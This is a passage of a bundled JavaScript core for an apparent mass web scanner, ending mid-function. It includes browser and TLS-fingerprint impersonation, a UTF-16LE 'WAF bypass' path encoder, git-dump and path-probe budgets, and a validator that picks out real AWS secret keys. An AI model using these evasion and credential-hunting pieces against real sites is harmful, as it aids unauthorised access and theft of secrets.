var __defProp = Object.defineProperty;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __esm = (fn, res, err) => function __init() {
  if (err) throw err[0];
  try {
    return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
  } catch (e) {
    throw err = [e], e;
  }
};
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};

// packages/core/src/di/tokens.ts
var TOKENS;
var init_tokens = __esm({
  "packages/core/src/di/tokens.ts"() {
    "use strict";
    TOKENS = {
      Config: /* @__PURE__ */ Symbol("IConfigProvider"),
      Http: /* @__PURE__ */ Symbol("IHttpClient"),
      Analyzer: /* @__PURE__ */ Symbol("IContentAnalyzer"),
      EventBus: /* @__PURE__ */ Symbol("IEventBus"),
      Dedup: /* @__PURE__ */ Symbol("IDedupStore"),
      Validator: /* @__PURE__ */ Symbol("IValidator"),
      Notifier: /* @__PURE__ */ Symbol("INotifier"),
      Logger: /* @__PURE__ */ Symbol("ILogger")
    };
  }
});

// packages/core/src/config/config-provider.ts
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
var ConfigProvider;
var init_config_provider = __esm({
  "packages/core/src/config/config-provider.ts"() {
    "use strict";
    ConfigProvider = class {
      config;
      patternFile;
      constructor(configPath) {
        const raw = JSON.parse(readFileSync(configPath, "utf8"));
        this.config = raw;
        const patternsPath = resolve(process.cwd(), raw.patternsFile);
        this.patternFile = JSON.parse(readFileSync(patternsPath, "utf8"));
      }
      get() {
        return this.config;
      }
      patterns() {
        return this.patternFile;
      }
      resolveBudget(name) {
        const profile = this.config.budgets[name] ?? name;
        const ms = this.config.budgetProfiles[profile] ?? this.config.budgetProfiles.standard;
        return ms;
      }
    };
  }
});

// packages/core/src/dedup/dedup-store.ts
function hashUrl(value) {
  let h = 2166136261;
  const s = value.toLowerCase();
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return (h >>> 0).toString(16);
}
var DedupStore;
var init_dedup_store = __esm({
  "packages/core/src/dedup/dedup-store.ts"() {
    "use strict";
    DedupStore = class {
      scopes = /* @__PURE__ */ new Map();
      checkAndMark(scope, key) {
        if (!key) return false;
        let set = this.scopes.get(scope);
        if (!set) {
          set = /* @__PURE__ */ new Set();
          this.scopes.set(scope, set);
        }
        if (set.has(key)) return false;
        set.add(key);
        return true;
      }
      reset(scope) {
        if (scope) this.scopes.delete(scope);
        else this.scopes.clear();
      }
      unmark(scope, key) {
        this.scopes.get(scope)?.delete(key);
      }
    };
  }
});

// packages/core/src/events/event-bus.ts
var EventBus;
var init_event_bus = __esm({
  "packages/core/src/events/event-bus.ts"() {
    "use strict";
    EventBus = class {
      handlers = /* @__PURE__ */ new Map();
      on(event, handler) {
        let set = this.handlers.get(event);
        if (!set) {
          set = /* @__PURE__ */ new Set();
          this.handlers.set(event, set);
        }
        const wrapped = handler;
        set.add(wrapped);
        return () => set.delete(wrapped);
      }
      emit(event, payload) {
        const set = this.handlers.get(event);
        if (!set) return;
        for (const h of set) {
          try {
            h(payload);
          } catch (err) {
            console.error(`[EVENT] handler failed for ${event}:`, err);
          }
        }
      }
    };
  }
});

// packages/core/src/http/decode-body.ts
import { brotliDecompressSync, gunzipSync, inflateRawSync, inflateSync } from "node:zlib";
function looksPlainText(buf) {
  if (!buf.length) return true;
  const c = buf[0];
  return c === 123 || c === 91 || c === 60 || c === 34 || c >= 32 && c < 127 && c !== 31;
}
function decodeHttpBody(body, contentEncoding) {
  if (!body.length) return "";
  const hint = (contentEncoding ?? "").toLowerCase();
  const gzipMagic = body.length >= 2 && body[0] === 31 && body[1] === 139;
  if (gzipMagic || hint.includes("gzip")) {
    try {
      return gunzipSync(body).toString("utf8");
    } catch {
      if (looksPlainText(body)) return body.toString("utf8");
    }
  }
  if (hint.includes("br") || hint.includes("brotli")) {
    try {
      return brotliDecompressSync(body).toString("utf8");
    } catch {
    }
  }
  if (hint.includes("deflate")) {
    try {
      return inflateSync(body).toString("utf8");
    } catch {
      try {
        return inflateRawSync(body).toString("utf8");
      } catch {
      }
    }
  }
  return body.toString("utf8");
}
var init_decode_body = __esm({
  "packages/core/src/http/decode-body.ts"() {
    "use strict";
  }
});

// packages/core/src/http/is-unreachable.ts
function errText(err) {
  return err instanceof Error ? `${err.name} ${err.message}` : String(err);
}
function isTlsPlaintextError(err) {
  return /wrong version number|ssl3_get_record|ERR_SSL_WRONG_VERSION_NUMBER|packet length too long/i.test(
    errText(err)
  );
}
function isTlsHandshakeError(err) {
  if (isTlsPlaintextError(err)) return false;
  return /SSL routines|unsupported protocol|ssl_choose_client_version|unrecognized name|handshake failure|tlsv1 alert|sslv3 alert|SSL alert number/i.test(
    errText(err)
  );
}
function isUnreachableError(err) {
  const msg = errText(err);
  return isTlsHandshakeError(err) || /ECONNREFUSED|ENOTFOUND|EHOSTUNREACH|ENETUNREACH|ECONNRESET|EPIPE|ETIMEDOUT|UND_ERR_CONNECT_TIMEOUT|UND_ERR_HEADERS_TIMEOUT|UND_ERR_BODY_TIMEOUT|UND_ERR_ABORTED|UND_ERR_SOCKET|UND_ERR_DESTROYED|ConnectTimeoutError|HeadersTimeoutError|BodyTimeoutError|TimeoutError|AbortError|Connect Timeout|other side closed|client is destroyed|disconnected before secure TLS|wrong version number|ssl3_get_record|ERR_SSL_WRONG_VERSION_NUMBER|packet length too long|HTTP\/1\.1 protocol|Invalid character in chunk size|HPE_INVALID_CHUNK|unsafe legacy renegotiation/i.test(
    msg
  );
}
function isDeadHostError(err) {
  if (isTlsPlaintextError(err) || isTlsHandshakeError(err) || isClientDestroyedError(err)) return false;
  const msg = errText(err);
  if (/disconnected before secure TLS|HTTP\/1\.1 protocol|Invalid character in chunk size|unsafe legacy renegotiation/i.test(msg)) return false;
  return /ECONNREFUSED|ENOTFOUND|EHOSTUNREACH|ENETUNREACH|UND_ERR_CONNECT_TIMEOUT|ConnectTimeoutError|Connect Timeout/i.test(
    msg
  );
}
function isClientDestroyedError(err) {
  return /client is destroyed|UND_ERR_DESTROYED|ClientDestroyedError/i.test(errText(err));
}
var init_is_unreachable = __esm({
  "packages/core/src/http/is-unreachable.ts"() {
    "use strict";
  }
});

// packages/core/src/url/normalize.ts
function normalizeScanUrl(line) {
  let s = line.replace(/^\uFEFF/, "").trim();
  if (!s || s.startsWith("#")) return null;
  if (!/^https?:\/\//i.test(s)) s = `https://${s}`;
  let parsed;
  try {
    parsed = new URL(s);
  } catch {
    return null;
  }
  if (!parsed.hostname) return null;
  parsed.hash = "";
  let href = parsed.toString();
  if (href.endsWith("/") && parsed.pathname === "/") {
    href = href.slice(0, -1);
  }
  return href;
}
function originOf(url) {
  try {
    const u = new URL(url);
    return `${u.protocol}//${u.host}`;
  } catch {
    return url;
  }
}
function httpsToHttpDefaultPort(url) {
  try {
    const u = new URL(url);
    if (u.protocol !== "https:") return url;
    u.protocol = "http:";
    u.port = "";
    return u.toString();
  } catch {
    return url;
  }
}
function httpsToHttpSamePort(url) {
  try {
    const u = new URL(url);
    if (u.protocol !== "https:") return url;
    const port = u.port || "443";
    u.protocol = "http:";
    u.port = port;
    return u.toString();
  } catch {
    return url;
  }
}
function homepageVariants(url) {
  const out = [];
  try {
    const u = new URL(url);
    out.push(u.toString());
    u.protocol = u.protocol === "https:" ? "http:" : "https:";
    out.push(u.toString());
  } catch {
    out.push(url);
  }
  return out;
}
function resolveUrl(base, ref) {
  try {
    return new URL(ref, base).toString();
  } catch {
    return null;
  }
}
function sameHost(a, b2) {
  try {
    return new URL(a).hostname === new URL(b2).hostname;
  } catch {
    return false;
  }
}
function scanIdentity(rawUrl, baseUrl) {
  return `${originOf(rawUrl)}|${originOf(baseUrl || rawUrl)}`;
}
var init_normalize = __esm({
  "packages/core/src/url/normalize.ts"() {
    "use strict";
  }
});

// packages/core/src/http/http-client.ts
import { Pool, request } from "undici";
import { setMaxListeners } from "node:events";
import { isIP } from "node:net";
import { constants as cryptoConstants } from "node:crypto";
function nextProfile() {
  const p = BROWSER_PROFILES[_profileIdx % BROWSER_PROFILES.length];
  _profileIdx++;
  return p;
}
function impersonateHeaders(impersonate, profile) {
  if (impersonate === "curl") {
    return {
      "user-agent": "curl/8.6.0",
      accept: "*/*"
    };
  }
  const base = {
    "user-agent": profile.ua,
    accept: impersonate === "firefox" ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1"
  };
  if (profile.secChUa) {
    base["sec-ch-ua"] = profile.secChUa;
    base["sec-ch-ua-mobile"] = profile.secChUaMobile;
    base["sec-ch-ua-platform"] = profile.secChUaPlatform;
  }
  return base;
}
function maxBytesFor(budget, override) {
  if (override != null) return override;
  if (budget === "gitDump") return 8 * 1024 * 1024;
  if (budget === "jsFetch") return 384 * 1024;
  if (budget === "pathProbe" || budget === "pathSlow") return 128 * 1024;
  return 256 * 1024;
}
function hostnameOf(origin) {
  try {
    return new URL(origin).hostname;
  } catch {
    return origin;
  }
}
var EMPTY, MAX_ORIGIN_POOLS, BROWSER_PROFILES, _profileIdx, CHROME_CIPHERS, POOL_OPTS, HttpClient;
var init_http_client = __esm({
  "packages/core/src/http/http-client.ts"() {
    "use strict";
    init_decode_body();
    init_is_unreachable();
    init_normalize();
    EMPTY = Buffer.alloc(0);
    MAX_ORIGIN_POOLS = 4096;
    BROWSER_PROFILES = [
      {
        // Chrome 124 / Windows
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        secChUa: '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        secChUaMobile: "?0",
        secChUaPlatform: '"Windows"'
      },
      {
        // Chrome 122 / Windows (older, common)
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        secChUa: '"Chromium";v="122", "Google Chrome";v="122", "Not-A.Brand";v="24"',
        secChUaMobile: "?0",
        secChUaPlatform: '"Windows"'
      },
      {
        // Edge 124 / Windows
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
        secChUa: '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        secChUaMobile: "?0",
        secChUaPlatform: '"Windows"'
      },
      {
        // Firefox 125 / Windows (no sec-ch-ua — Firefox doesn't send it)
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        secChUa: "",
        secChUaMobile: "",
        secChUaPlatform: ""
      },
      {
        // Chrome 124 / macOS
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        secChUa: '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        secChUaMobile: "?0",
        secChUaPlatform: '"macOS"'
      }
    ];
    _profileIdx = 0;
    CHROME_CIPHERS = [
      "TLS_AES_128_GCM_SHA256",
      "TLS_AES_256_GCM_SHA384",
      "TLS_CHACHA20_POLY1305_SHA256",
      "ECDHE-ECDSA-AES128-GCM-SHA256",
      "ECDHE-RSA-AES128-GCM-SHA256",
      "ECDHE-ECDSA-AES256-GCM-SHA384",
      "ECDHE-RSA-AES256-GCM-SHA384",
      "ECDHE-ECDSA-CHACHA20-POLY1305",
      "ECDHE-RSA-CHACHA20-POLY1305",
      "ECDHE-RSA-AES128-SHA",
      "ECDHE-RSA-AES256-SHA",
      "AES128-GCM-SHA256",
      "AES256-GCM-SHA384",
      "AES128-SHA",
      "AES256-SHA"
    ].join(":");
    POOL_OPTS = {
      connect: {
        rejectUnauthorized: false,
        timeout: 1500,
        minVersion: "TLSv1.2",
        secureOptions: cryptoConstants.SSL_OP_LEGACY_SERVER_CONNECT,
        /** Chrome-ordered cipher list to match ClientHello fingerprint. */
        ciphers: CHROME_CIPHERS
      },
      keepAliveTimeout: 4e3,
      keepAliveMaxTimeout: 12e3,
      connections: 40,
      pipelining: 1,
      headersTimeout: 3e3,
      bodyTimeout: 12e3
    };
    HttpClient = class {
      constructor(config, logger) {
        this.config = config;
        this.logger = logger;
      }
      config;
      logger;
      pools = /* @__PURE__ */ new Map();
      inFlight = /* @__PURE__ */ new Map();
      /** HTTPS origins that answered with plaintext HTTP — later GETs use http://host:443. */
      plaintextHttps = /* @__PURE__ */ new Map();
      get(url, options = {}) {
        return this.request("GET", url, options);
      }
      post(url, options = {}) {
        return this.request("POST", url, options);
      }
      bump(origin, delta) {
        const next = (this.inFlight.get(origin) ?? 0) + delta;
        if (next <= 0) this.inFlight.delete(origin);
        else this.inFlight.set(origin, next);
      }
      dropPool(origin) {
        const stale = this.pools.get(origin);
        this.pools.delete(origin);
        void stale?.destroy();
      }
      evictIdle() {
        while (this.pools.size >= MAX_ORIGIN_POOLS) {
          let evicted = false;
          for (const origin of this.pools.keys()) {
            if ((this.inFlight.get(origin) ?? 0) > 0) continue;
            this.dropPool(origin);
            evicted = true;
            break;
          }
          if (!evicted) break;
        }
      }
      markPlaintextHttps(url) {
        const origin = originOf(url);
        if (!origin.startsWith("https:")) return;
        if (this.plaintextHttps.has(origin)) {
          this.plaintextHttps.delete(origin);
          this.plaintextHttps.set(origin, true);
          return;
        }
        while (this.plaintextHttps.size >= MAX_ORIGIN_POOLS) {
          const oldest = this.plaintextHttps.keys().next().value;
          if (!oldest) break;
          this.plaintextHttps.delete(oldest);
        }
        this.plaintextHttps.set(origin, true);
      }
      rewriteIfPlaintext(url) {
        try {
          const origin = new URL(url).origin;
          if (this.plaintextHttps.has(origin)) return httpsToHttpSamePort(url);
        } catch {
        }
        return url;
      }
      abortFor(options, budgetMs) {
        const ac = new AbortController();
        setMaxListeners(32, ac.signal);
        const timer = setTimeout(() => ac.abort(), budgetMs);
        const onParent = () => ac.abort();
        const parent = options.signal;
        if (parent) {
          if (parent.aborted) ac.abort();
          else parent.addEventListener("abort", onParent, { once: true });
        }
        return {
          signal: ac.signal,
          dispose: () => {
            clearTimeout(timer);
            parent?.removeEventListener("abort", onParent);
          }
        };
      }
      dispatcherFor(url) {
        let origin = url;
        try {
          origin = new URL(url).origin;
        } catch {
        }
        const hit = this.pools.get(origin);
        if (hit) {
          this.pools.delete(origin);
          this.pools.set(origin, hit);
          return hit;
        }
        this.evictIdle();
        const ip = isIP(hostnameOf(origin)) !== 0;
        const pool = new Pool(origin, {
          ...POOL_OPTS,
          connect: {
            ...POOL_OPTS.connect,
            ...ip ? { servername: "" } : {}
          }
        });
        this.pools.set(origin, pool);
        return pool;
      }
      async request(method, url, options, retried = false) {
        const target = this.rewriteIfPlaintext(url);
        const origin = originOf(target);
        const budget = this.config.resolveBudget(options.budget ?? "httpRequest");
        const maxBytes = maxBytesFor(options.budget, options.maxBytes);
        const abort = this.abortFor(options, budget);
        this.bump(origin, 1);
        try {
          const res = await request(target, {
            method,
            dispatcher: this.dispatcherFor(target),
            signal: abort.signal,
            body: method === "POST" ? options.body : void 0,
            headers: {
              // Browser header spoof: realistic UA + sec-ch-ua headers.
              // Does NOT affect TLS fingerprint — see module-level comment.
              ...impersonateHeaders(options.impersonate ?? "chrome", nextProfile()),
              ...method === "POST" && options.body ? { "content-type": "application/json" } : {},
              ...options.headers
            },
            maxRedirections: 5
          });
          const chunks = [];
          let total = 0;
          let truncated = false;
          for await (const chunk of res.body) {
            const buf = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
            total += buf.length;
            if (total > maxBytes) {
              truncated = true;
              break;
            }
            chunks.push(buf);
          }
          if (truncated) {
            try {
              await res.body.dump();
            } catch {
              try {
                res.body.destroy();
              } catch {
              }
            }
          }
          const raw = Buffer.concat(chunks);
          const headers = {};
          for (const [k, v] of Object.entries(res.headers)) {
            if (typeof v === "string") headers[k.toLowerCase()] = v;
            else if (Array.isArray(v)) headers[k.toLowerCase()] = v.join(", ");
          }
          const text = decodeHttpBody(raw, headers["content-encoding"]);
          const body = options.keepBody ? raw : EMPTY;
          return {
            url: target,
            status: res.statusCode,
            headers,
            body,
            text
          };
        } catch (err) {
          if (!retried && isTlsPlaintextError(err)) {
            const alt = httpsToHttpSamePort(target);
            if (alt !== target) {
              this.markPlaintextHttps(target);
              return this.request(method, alt, options, true);
            }
          }
          if (!retried && isClientDestroyedError(err)) {
            this.dropPool(origin);
            return this.request(method, target, options, true);
          }
          if (!isUnreachableError(err)) {
            this.logger.warn("HTTP", `${method} failed ${target}: ${err.message}`);
          }
          throw err;
        } finally {
          abort.dispose();
          this.bump(origin, -1);
        }
      }
    };
  }
});

// packages/core/src/util/which.ts
import { execFile } from "node:child_process";
import { promisify } from "node:util";
async function which(name) {
  const cmd = process.platform === "win32" ? "where" : "which";
  try {
    const { stdout } = await exec(cmd, [name], { timeout: 3e3 });
    const first = stdout.trim().split(/\r?\n/)[0] ?? "";
    return first || null;
  } catch {
    return null;
  }
}
var exec;
var init_which = __esm({
  "packages/core/src/util/which.ts"() {
    "use strict";
    exec = promisify(execFile);
  }
});

// packages/core/src/http/curl-impersonate-client.ts
import { execFile as execFile2 } from "node:child_process";
import { promisify as promisify2 } from "node:util";
async function resolveBin() {
  if (_resolvedBin !== void 0) return _resolvedBin;
  const envBin = process.env["CURL_IMPERSONATE_BIN"];
  if (envBin) {
    _resolvedBin = envBin;
    return _resolvedBin;
  }
  for (const name of CANDIDATE_BINS) {
    const found = await which(name);
    if (found) {
      _resolvedBin = found;
      return _resolvedBin;
    }
  }
  _resolvedBin = null;
  return null;
}
async function hasCurlImpersonate() {
  return await resolveBin() !== null;
}
function parseCurlOutput(raw) {
  const text = raw.toString("latin1");
  const blocks = text.split(/\r?\n\r?\n/);
  let headerBlock = "";
  let bodyBlockIdx = 1;
  for (let i = 0; i < blocks.length; i++) {
    if ((blocks[i] ?? "").match(/^HTTP\//i)) {
      headerBlock = blocks[i] ?? "";
      bodyBlockIdx = i + 1;
    }
  }
  const headerLines = headerBlock.split(/\r?\n/);
  const statusMatch = (headerLines[0] ?? "").match(/HTTP\/[\d.]+\s+(\d+)/);
  const status = statusMatch ? parseInt(statusMatch[1], 10) : 0;
  const headers = {};
  for (const line of headerLines.slice(1)) {
    const idx = line.indexOf(":");
    if (idx > 0) {
      headers[line.slice(0, idx).trim().toLowerCase()] = line.slice(idx + 1).trim();
    }
  }
  const bodyText = blocks.slice(bodyBlockIdx).join("\r\n\r\n");
  const body = Buffer.from(bodyText, "latin1");
  return { status, headers, body };
}
function buildArgs(url, method, options, bin, timeout, insecure) {
  const args = [];
  if (!bin.includes("chrome") && !bin.includes("ff")) {
    args.push("--impersonate", "chrome120");
  }
  args.push(
    "-s",
    // silent — no progress bar
    "-i",
    // include response headers
    "-o",
    "-",
    // body → stdout
    "--location",
    // follow redirects
    "--max-time",
    String(timeout),
    "--compressed"
    // accept gzip/br/zstd
  );
  if (insecure) args.push("--insecure");
  if (method === "HEAD") args.push("--head");
  if (method === "POST") {
    args.push("-X", "POST");
    if (options.body) args.push("--data-raw", options.body);
  }
  for (const [k, v] of Object.entries(options.headers ?? {})) {
    args.push("-H", `${k}: ${v}`);
  }
  args.push(url);
  return args;
}
async function exec2(url, method, options, timeout, insecure) {
  const bin = await resolveBin();
  if (!bin) {
    throw new Error(
      "curl-impersonate not found. Set CURL_IMPERSONATE_BIN or install from https://github.com/lwthiker/curl-impersonate"
    );
  }
  const args = buildArgs(url, method, options, bin, timeout, insecure);
  const { stdout } = await execFileAsync(bin, args, {
    encoding: "buffer",
    timeout: (timeout + 5) * 1e3,
    maxBuffer: 10 * 1024 * 1024
  });
  const raw = stdout;
  const { status, headers, body } = parseCurlOutput(raw);
  const text = body.toString("utf8");
  return { url, status, headers, body, text };
}
var execFileAsync, CANDIDATE_BINS, _resolvedBin, CurlImpersonateClient;
var init_curl_impersonate_client = __esm({
  "packages/core/src/http/curl-impersonate-client.ts"() {
    "use strict";
    init_which();
    execFileAsync = promisify2(execFile2);
    CANDIDATE_BINS = [
      "curl-impersonate-chrome",
      "curl-impersonate-ff",
      "curl-impersonate"
    ];
    _resolvedBin = void 0;
    CurlImpersonateClient = class {
      _timeout;
      _insecure;
      constructor(opts = {}) {
        this._timeout = opts.timeout ?? 15;
        this._insecure = opts.insecure ?? false;
      }
      get(url, options = {}) {
        return exec2(url, "GET", options, this._timeout, this._insecure);
      }
      post(url, options = {}) {
        return exec2(url, "POST", options, this._timeout, this._insecure);
      }
    };
  }
});

// packages/core/src/logging/logger.ts
function stamp() {
  return (/* @__PURE__ */ new Date()).toISOString().slice(11, 23);
}
var TAG, Logger;
var init_logger = __esm({
  "packages/core/src/logging/logger.ts"() {
    "use strict";
    TAG = {
      PATHS: "PATHS",
      JS: "JS",
      GIT: "GIT",
      RECON: "RECON",
      VALIDATOR: "VALIDATOR",
      TELEGRAM: "TELEGRAM",
      ORCH: "ORCH",
      ANALYZER: "ANALYZER"
    };
    Logger = class {
      info(module, msg, ...args) {
        console.log(`[${stamp()}] [${TAG[module] ?? module}] ${msg}`, ...args);
      }
      warn(module, msg, ...args) {
        console.warn(`[${stamp()}] [${TAG[module] ?? module}] ${msg}`, ...args);
      }
      error(module, msg, ...args) {
        console.error(`[${stamp()}] [${TAG[module] ?? module}] ${msg}`, ...args);
      }
    };
  }
});

// packages/core/src/di/container.ts
var Container;
var init_container = __esm({
  "packages/core/src/di/container.ts"() {
    "use strict";
    Container = class {
      regs = /* @__PURE__ */ new Map();
      registerSingleton(token, factory) {
        this.regs.set(token, { factory, lifecycle: "singleton" });
        return this;
      }
      registerTransient(token, factory) {
        this.regs.set(token, { factory, lifecycle: "transient" });
        return this;
      }
      registerInstance(token, instance) {
        this.regs.set(token, { factory: () => instance, lifecycle: "singleton", instance });
        return this;
      }
      resolve(token) {
        const reg = this.regs.get(token);
        if (!reg) {
          throw new Error(`DI: no registration for ${String(token)}`);
        }
        if (reg.lifecycle === "singleton") {
          if (reg.instance === void 0) {
            reg.instance = reg.factory(this);
          }
          return reg.instance;
        }
        return reg.factory(this);
      }
      tryResolve(token) {
        if (!this.regs.has(token)) return void 0;
        return this.resolve(token);
      }
    };
  }
});

// packages/core/src/modules/module-registry.ts
import { readdir } from "node:fs/promises";
import { join, resolve as resolve2 } from "node:path";
import { pathToFileURL } from "node:url";
var ModuleRegistry;
var init_module_registry = __esm({
  "packages/core/src/modules/module-registry.ts"() {
    "use strict";
    ModuleRegistry = class {
      constructor(logger) {
        this.logger = logger;
      }
      logger;
      modules = [];
      register(mod) {
        this.modules.push(mod);
        this.logger.info("ORCH", `module loaded: ${mod.name} (phase=${mod.phase})`);
      }
      enabled(config) {
        return this.modules.filter((m) => m.isEnabled(config));
      }
      byPhase(phase, config) {
        return this.enabled(config).filter((m) => m.phase === phase);
      }
      // Convention: packages/engine-<name>/src/index.ts default-exports a ScanModule class.
      async discover(packagesRoot, instantiate) {
        const root = resolve2(packagesRoot);
        let entries = [];
        try {
          entries = (await readdir(root, { withFileTypes: true })).filter((e) => e.isDirectory() && e.name.startsWith("engine-")).map((e) => e.name);
        } catch (err) {
          this.logger.warn("ORCH", `module discover failed: ${err.message}`);
          return;
        }
        for (const name of entries) {
          const candidates = [
            join(root, name, "src", "index.ts"),
            join(root, name, "dist", "index.js"),
            join(root, name, "index.ts")
          ];
          for (const file of candidates) {
            try {
              const mod = await import(pathToFileURL(file).href);
              const Ctor = mod.default ?? mod.ScanModule;
              if (Ctor) {
                this.register(instantiate(Ctor));
                break;
              }
              if (typeof mod.createModule === "function") {
                this.register(mod.createModule());
                break;
              }
            } catch {
              continue;
            }
          }
        }
      }
    };
  }
});

// packages/core/src/url/waf-bypass.ts
function percentEncodeBytes(buf) {
  let out = "";
  for (let i = 0; i < buf.length; i++) {
    const byte = buf[i];
    out += "%" + byte.toString(16).padStart(2, "0").toUpperCase();
  }
  return out;
}
function encodePathUtf16le(path) {
  const prefix = path.startsWith("/") ? "/" : "";
  const body = path.startsWith("/") ? path.slice(1) : path;
  if (!body) return prefix;
  const buf = Buffer.from(body, "utf16le");
  return prefix + percentEncodeBytes(buf);
}
function utf16leBypassPath(path) {
  return encodePathUtf16le(path);
}
var init_waf_bypass = __esm({
  "packages/core/src/url/waf-bypass.ts"() {
    "use strict";
  }
});

// packages/core/src/secrets/aws-secret.ts
function isValidAwsSecretKey(s) {
  const v = s.trim();
  if (v.length !== 40) return false;
  if (/[\s?!,;:"'()[\]{}<>._~`@#$%^&*|\\-]/.test(v)) return false;
  if (!/^[A-Za-z0-9/+=]+$/.test(v)) return false;
  if (/EXAMPLE/i.test(v)) return false;
  if (/^6[LlPpIiQqFf]/.test(v)) return false;
  if (/AAAAA/i.test(v)) return false;
  if (/^(AKIA|ASIA|ACCA|AGPA|AIDA|AIPA|ANPA|ANVA|APKA|AROA|ASCA)/i.test(v)) return false;
  if (/^(pk_|sk_|rk_|SG\.|ghp_|gho_|github_pat)/.test(v)) return false;
  if (new Set(v.replace(/=+$/, "")).size < 10) return false;
  if (looksLikeEncodedJoke(v)) return false;
  return true;
}
function looksLikeEncodedJoke(v) {
  let text;
  try {
    text = Buffer.from(v, "base64").toString("utf8");
  } catch {
    return false;
  }
  if (!text || text.includes("\uFFFD")) return false;
  if (/this_is_fake|fake[_-]|example|dummy|placeholder|donkey|not_a_real|sample_key|your_secret|absolute/i.test(text)) {
    return true;
  }
  const letters = (text.match(/[A-Za-z]/g) ?? []).length;
  const words = (text.match(/[A-Za-z]{4,}/g) ?? []).length;
  return letters / text.length >= 0.7 && words >= 3;
}
function isAwsAccessKey(s) {
  return /^A[KS]IA[A-Z0-9]{16}$/.test(s.trim());
}
function isVendorSecretPath(path) {
  return /node_modules|bower_components/i.test(path ?? "");
}
var init_aws_secret = __esm({
  "packages/core/src/secrets/aws-secret.ts"() {
    "use strict";
  }
});

// packages/core/src/next-actions.ts
function extractNextActionIds(html) {
  const out = [];
  if (!html) return out;
  const seen = /* @__PURE__ */ new Set();
  const push = (raw) => {
    const id = (raw ?? "").toLowerCase();
    if (id && !seen.has(id)) {
      seen.add(id);
      out.push(id);
    }
  };
  ACTION_ID_REF.lastIndex = 0;
  let m;
  while (m = ACTION_ID_REF.exec(html)) push(m[1]);
  FLIGHT_PUSH.lastIndex = 0;
  while (m = FLIGHT_PUSH.exec(html)) {
    const chunk = m[1] ?? "";
    for (const re of [CHUNK_ID_ESCAPED, CHUNK_ID_PLAIN]) {
      re.lastIndex = 0;
      let c;
      while (c = re.exec(chunk)) push(c[1]);
    }
  }
  CHUNK_ID_PLAIN.lastIndex = 0;
  while (m = CHUNK_ID_PLAIN.exec(html)) push(m[1]);
  return out;
}
var ACTION_ID_REF, FLIGHT_PUSH, CHUNK_ID_ESCAPED, CHUNK_ID_PLAIN;
var init_next_actions = __esm({
  "packages/core/src/next-actions.ts"() {
    "use strict";
    ACTION_ID_REF = /\$ACTION_ID_([A-Za-z0-9_-]{8,64})/g;
    FLIGHT_PUSH = /self\.__next_f\.push\(\[1,"((?:[^"\\]|\\.)*)"\]\)/g;
    CHUNK_ID_ESCAPED = /\\"id\\"\s*:\s*\\"?([a-f0-9]{32,40})\\?"?/g;
    CHUNK_ID_PLAIN = /"id"\s*:\s*"?([a-f0-9]{32,40})"?/g;
  }
});

// packages/core/src/concurrency/semaphore.ts
function abortError(reason) {
  const err = new Error("semaphore wait aborted");
  err.name = "AbortError";
  err.reason = reason;
  return err;
}
var Semaphore;
var init_semaphore = __esm({
  "packages/core/src/concurrency/semaphore.ts"() {
    "use strict";
    Semaphore = class {
      constructor(limit) {
        this.limit = limit;
        if (!Number.isFinite(limit) || limit < 1) {
          throw new Error(`semaphore limit must be >= 1, got ${limit}`);
        }
      }
      limit;
      active = 0;
      waiters = [];
      wi = 0;
      acquire(signal) {
        if (signal?.aborted) return Promise.reject(abortError(signal.reason));
        if (this.active < this.limit) {
          this.active++;
          return Promise.resolve(() => this.release());
        }
        return new Promise((resolve5, reject) => {
          const waiter = {
            resolve: resolve5,
            reject,
            signal,
            cancelled: false,
            onAbort: void 0
          };
          if (signal) {
            waiter.onAbort = () => {
              waiter.cancelled = true;
              reject(abortError(signal.reason));
            };
            signal.addEventListener("abort", waiter.onAbort, { once: true });
          }
          this.waiters.push(waiter);
        });
      }
      release() {
        this.active--;
        while (this.wi < this.waiters.length) {
          const waiter = this.waiters[this.wi++];
          if (waiter.cancelled) continue;
          if (waiter.signal && waiter.onAbort) {
            waiter.signal.removeEventListener("abort", waiter.onAbort);
          }
          this.active++;
          waiter.resolve(() => this.release());
          return;
        }
        this.waiters.length = 0;
        this.wi = 0;
      }
    };
  }
});

// packages/core/src/index.ts
function registerCore(container, configPath) {
  container.registerSingleton(TOKENS.Config, () => new ConfigProvider(configPath));
  container.registerSingleton(TOKENS.Logger, () => new Logger());
  container.registerSingleton(TOKENS.EventBus, () => new EventBus());
  container.registerSingleton(TOKENS.Dedup, () => new DedupStore());
  container.registerSingleton(
    TOKENS.Http,
    (c) => {
      const logger = c.resolve(TOKENS.Logger);
      const undici = new HttpClient(c.resolve(TOKENS.Config), logger);
      if (process.env["CURL_IMPERSONATE_BIN"]) {
